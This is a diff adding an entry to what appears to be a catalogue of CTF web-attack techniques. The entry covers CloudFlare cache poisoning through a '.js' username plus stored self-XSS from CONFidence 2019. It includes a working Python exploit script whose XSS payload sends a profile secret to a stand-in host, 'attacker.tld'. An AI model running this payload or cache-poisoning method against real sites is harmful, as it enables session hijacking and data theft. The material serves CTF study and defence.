@@ -22,6 +22,7 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)](#postmessage-null-origin-bypass-via-data-uri-iframe-backdoorctf-2018)
 - [CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)](#csp-bypass-via-attacker-controlled-mime-type-for-same-origin-scripts-midnight-sun-ctf-finals-2018)
 - [React Component State Extraction via __reactInternalInstance$ (RCTF 2018)](#react-component-state-extraction-via-__reactinternalinstance-rctf-2018)
+- [CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)](#cloudflare-cache-poisoning-via-js-username--stored-self-xss-confidence-2019-teaser)
 
 ---
 
@@ -694,3 +695,45 @@ For React 17+ the property name is `__reactFiber$<random>`, and the path is `.st
 **Key insight:** React stores component state on the DOM itself for hot-reload and devtools support. XSS within the same document therefore has full read access to props and state, including values that were fetched client-side and never echoed into the markup (auth tokens, private chats, admin panels). Harden dev builds by stripping `__reactFiber$`/`__reactInternalInstance$` attachments in production or by preventing XSS upstream — CSP alone is not enough because the state read happens in JavaScript that CSP already permits.
 
 **References:** RCTF 2018 — writeup 10125
+
+---
+
+## CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)
+
+**Pattern:** Profile page has a stored self-XSS (e.g. attribute injection on a `<select>` `shoesize` field via `tabindex=1 contenteditable autofocus onfocus=...`). Self-XSS alone is useless — the XSS only fires for the owner of the profile. CDN caches by URL extension, not `Content-Type`, so registering a username whose URL ends in `.js` makes the CDN treat `/profile/<user>.js` as a cacheable static JS asset. A single logged-in hit from the attacker's session poisons the shared edge cache: every subsequent visitor — including the challenge admin bot — is served the attacker's authenticated HTML, executing the XSS under the victim's session.
+
+```python
+# 1. Pick a region-matching VM so your cache hits land in the admin's region.
+#    (CloudFlare is region-sharded; colocate with other challenge infra.)
+
+# 2. Register a user whose name ends in .js
+import requests, random
+s = requests.Session()
+s.get('http://target/login')
+user = f'hfs-{random.randint(10**7, 10**8)}.js'
+s.post('http://target/login', data=f'login={user}&password={user}',
+       headers={'Content-Type': 'application/x-www-form-urlencoded'})
+
+# 3. Store self-XSS via the shoesize select attribute injection
+payload = ('fetch("/profile").then(e=>e.text()).then(f=>'
+           'new Image().src="//attacker.tld/?"+/secret(.*)>/.exec(f)[0])')
+raw = (
+  '------B\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nazz\r\n'
+  '------B\r\nContent-Disposition: form-data; name="shoesize"\r\n\r\n'
+  f'1 tabindex=1 contenteditable autofocus onfocus={payload}\r\n'
+  '------B\r\nContent-Disposition: form-data; name="secret"\r\n\r\nasd\r\n'
+  '------B--\r\n'
+)
+s.post(f'http://target/profile/{user}', data=raw,
+       headers={'Content-Type': 'multipart/form-data; boundary=----B'})
+
+# 4. Poison the edge cache: fetch once while logged in
+s.get(f'http://target/profile/{user}')
+
+# 5. Report the profile to the admin bot -> cached (authenticated) HTML is served
+#    to the admin, XSS fires, attacker.tld logs ?secret=<flag>
+```
+
+**Key insight:** CDNs cache by URL path/extension, not response `Content-Type` or `Vary: Cookie`; a `.js` (or `.css`, `.svg`, `.ico`, `.png`) suffix often flips a per-user page into a globally-shared static asset and converts a self-XSS into a wormable stored XSS. Always test whether appending common static extensions yields the *same* authenticated content from an unauthenticated fetch — that is the poisoning primitive. Admin-bot challenges behind CloudFlare are especially vulnerable; once poisoned, the next admin visit executes your payload with their cookies.
+
+**References:** CONFidence CTF 2019 Teaser — Web 50, writeup 13925. Background: [PortSwigger: Practical Web Cache Poisoning](https://portswigger.net/blog/practical-web-cache-poisoning).
